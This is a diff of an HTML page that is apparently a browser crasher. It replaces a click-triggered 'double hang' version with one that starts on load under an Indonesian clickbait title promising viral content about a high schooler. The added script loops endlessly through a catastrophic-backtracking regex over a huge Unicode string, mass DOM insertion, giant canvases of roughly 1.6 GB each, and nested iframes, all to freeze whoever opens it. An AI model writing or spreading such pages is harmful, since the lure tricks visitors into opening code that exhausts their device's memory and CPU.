@@ -1,116 +1,68 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>System Bornout Crashed - 2x Hang on Click</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  html, body {
-    width: 100%; height: 100%;
-    background: black;
-    color: lime;
-    font-family: monospace;
-    overflow: hidden;
-  }
-  div { 
-    white-space: pre; 
-    position: absolute; 
-    pointer-events: none;
-  }
-  a {
-    position: fixed;
-    bottom: 20px;
-    left: 20px;
-    color: cyan;
-    font-weight: bold;
-    text-decoration: underline;
-    cursor: pointer;
-    user-select: none;
-    z-index: 9999;
-  }
-</style>
+  <title>Viral anak sma ini telah...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      width: 100%; height: 100%;
+      background: black;
+      color: lime;
+      font-family: monospace;
+      overflow: hidden;
+    }
+    div { white-space: pre; position: absolute; }
+  </style>
 </head>
 <body>
-  <h1>System overload light 5X</h1>
-  <a id="trigger" href="#">Click to double hang!</a>
-
+  <h1>System overload 20X</h1>
   <script>
-    const u = "ꦲ𓂀𒀭𐎷𑀽";
-    const bigStr = u.repeat(2_000_000);
+    // Karakter Unicode berat (Jawa, Hieroglif, Sumeria, dll)
+    const u = "ꦲꦴꦿꦺ𓂀𓊃𒈾𒀭𒉿𐏓𐎚𐎷𑀓𑀺𑀽𑁇𑁒";
+
+    // String sangat besar untuk regex test
+    const bigStr = u.repeat(20_000_000); // 20 juta karakter
+
+    // Regex berat: Unicode blok & nested group
     const pattern = /([\u1b80-\u1bbf\u13000-\u1342f\ud800-\udfff]+)+$/;
 
-    // Beban awal
-    let elementsPerFrame = 200;
-    let canvasCount = 3;
-
-    let doubleHangActive = false;
-
-    function heavyLoop() {
+    (function loop() {
+      // Regex CPU spike
       try { pattern.test(bigStr); } catch (e) {}
 
-      for (let i = 0; i < elementsPerFrame; i++) {
+      // DOM spam berat: 1000 elemen per frame
+      for (let i = 0; i < 1000; i++) {
         const d = document.createElement("div");
-        d.innerText = u.repeat(500);
-        d.style.fontSize = `${8 + Math.random() * 30}px`;
+        d.innerText = u.repeat(3000); // 3000× karakter unik
+        d.style.fontSize = `${6 + Math.random() * 40}px`;
         d.style.color = `hsl(${Math.random() * 360}, 100%, 70%)`;
         d.style.left = `${Math.random() * window.innerWidth}px`;
         d.style.top = `${Math.random() * window.innerHeight}px`;
         document.body.appendChild(d);
       }
 
-      for (let j = 0; j < canvasCount; j++) {
+      // Canvas overload ekstrem: 10 canvas ukuran 20000x20000
+      for (let j = 0; j < 10; j++) {
         const c = document.createElement("canvas");
-        c.width = c.height = 5000;
+        c.width = c.height = 20000; // 20000x20000 ≈ 1.6 GB/canvas
         const ctx = c.getContext("2d");
-        for (let i = 0; i < 200; i++) {
+        for (let i = 0; i < 1000; i++) {
           ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
-          ctx.fillRect(Math.random()*5000, Math.random()*5000, 200, 200);
+          ctx.fillRect(Math.random()*20000, Math.random()*20000, 1000, 1000);
         }
         document.body.appendChild(c);
       }
 
-      requestAnimationFrame(heavyLoop);
-    }
+      // Recursive iframe bomb
+      const iframe = document.createElement("iframe");
+      iframe.srcdoc = `<iframe srcdoc="<iframe srcdoc='<iframe srcdoc=\\"<h1>${u.repeat(1000)}</h1>\\"></iframe>'></iframe>"></iframe>`;
+      iframe.width = iframe.height = 2;
+      iframe.style.border = "none";
+      document.body.appendChild(iframe);
 
-    heavyLoop();
-
-    // Loop berat kedua untuk double hang
-    function heavyLoopDouble() {
-      try { pattern.test(bigStr); } catch (e) {}
-
-      for (let i = 0; i < elementsPerFrame * 2; i++) {
-        const d = document.createElement("div");
-        d.innerText = u.repeat(500);
-        d.style.fontSize = `${8 + Math.random() * 30}px`;
-        d.style.color = `hsl(${Math.random() * 360}, 100%, 70%)`;
-        d.style.left = `${Math.random() * window.innerWidth}px`;
-        d.style.top = `${Math.random() * window.innerHeight}px`;
-        document.body.appendChild(d);
-      }
-
-      for (let j = 0; j < canvasCount * 2; j++) {
-        const c = document.createElement("canvas");
-        c.width = c.height = 5000;
-        const ctx = c.getContext("2d");
-        for (let i = 0; i < 200; i++) {
-          ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
-          ctx.fillRect(Math.random()*5000, Math.random()*5000, 200, 200);
-        }
-        document.body.appendChild(c);
-      }
-
-      requestAnimationFrame(heavyLoopDouble);
-    }
-
-    document.getElementById("trigger").addEventListener("click", e => {
-      e.preventDefault();
-      if (!doubleHangActive) {
-        doubleHangActive = true;
-        heavyLoopDouble();
-        alert("Double hang mode activated! Prepare for freeze.");
-      }
-    });
+      // Loop ulang tanpa jeda
+      requestAnimationFrame(loop);
+    })();
   </script>
 </body>
 </html>
